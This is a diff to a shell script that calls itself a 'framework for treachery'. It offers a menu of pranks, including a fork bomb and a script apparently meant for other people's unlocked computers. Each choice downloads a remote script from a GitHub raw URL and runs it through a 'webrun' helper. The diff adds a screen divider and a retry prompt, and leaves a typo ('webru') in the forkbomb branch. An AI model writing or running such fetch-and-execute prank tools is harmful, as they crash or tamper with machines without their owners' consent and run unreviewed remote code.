@@ -23,6 +23,9 @@ webrun(){
 			;;
 	esac
 }
+split_screen(){
+	printf "\033(0"%"`tput cols`"s"\033(B\n" | tr ' ' 'q'
+}
 BASEURL="https://raw.githubusercontent.com/BeerB34r/treachery/refs/heads/master"
 # Main program
 echo -n 'Hello and welcome to this framework for treachery, built by the Goblin himself, for your execution pleasure. within you will find many "useful" options, available to you through just a few command-line arguments.'"\n\n"
@@ -34,7 +37,7 @@ treachery(){
 	then
 		echo -n "Please provide your choice of treachery: "
 		read INPUT
-		echo ""
+		split_screen
 	fi
 # the heart of the program, does all the heavy lifting
 	case "${INPUT}" in
@@ -53,35 +56,44 @@ treachery(){
 			treachery
 			;;
 		"forked bom")
-			echo -n "Forked bom chosen\n"
+			echo "Forked bom chosen"
 			webrun ${BASEURL}/assorted/forked_bom/deploy_fork_bom.sh
 			;;
 		"forkbomb")
-			echo -n "Forkbomb chosen\n"
+			echo "Forkbomb chosen"
 			webru ${BASEURL}/assorted/forkbomb.sh
 			;;
 		"gif")
-			echo -n "Gif chosen\n"
+			echo "Gif chosen"
 			webrun ${BASEURL}/assorted/gif.sh
 			;;
 		"parrot")
-			echo -n "Parrot chosen\n"
+			echo "Parrot chosen"
 			webrun ${BASEURL}/assorted/parrot.sh
 			;;
 		"boykisser")
-			echo -n "Boykisser chosen\n"
+			echo "Boykisser chosen"
 			webrun ${BASEURL}/assorted/you_like_leaving_your_screen_unlocked_dont_you.sh
 			;;
 		"prompt")
-			echo -n "Prompt chosen\n"
+			echo "Prompt chosen"
 			webrun ${BASEURL}/assorted/prompt.sh
 			;;
 		*)
 			if [ -n "${INPUT}" ]
 			then
-				echo -n "'${INPUT}' not found\n"
+				echo "'${INPUT}' not found"
+			else
+				echo "No input detected, abandoning treachery"
+				exit
 			fi
-			echo -n "Treachery canceled\n"
+			read -p "try again? [y/n]: " RETRY
+			if [ ! "${RETRY}" = "n" ]
+			then
+				treachery 
+			else
+				echo "Treachery canceled"
+			fi
 			;;
 	esac
 }
